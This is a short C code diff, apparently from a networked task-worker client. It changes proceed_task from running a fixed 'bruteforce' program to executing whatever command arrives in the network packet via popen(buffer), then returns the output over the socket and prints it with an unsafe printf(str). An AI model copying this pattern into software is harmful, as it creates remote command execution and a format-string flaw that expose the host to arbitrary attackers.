@@ -59,13 +59,13 @@ void proceed_task(struct mlc_packet_header *header,char *buffer)
     //system("clear");
     //sprintf(animfile, "cat anim/%d", frame);
     //system(animfile);
-
-    FILE *f = popen("./application/bruteforce 123 189", "r");
+    FILE *f = popen(buffer, "r");
     char *str = calloc(1, 1024);
     fread(str, 1, 1024, f);
     pclose(f);
-    printf("%s\n",str);
-    //send_packet(1, 1, 3, str, strlen(str), sock);
+    printf("%s\n",buffer);
+    printf(str);
+    send_packet(1, 1, 3, str, strlen(str), sock);
     //free(str);
     //free(animfile);
 }
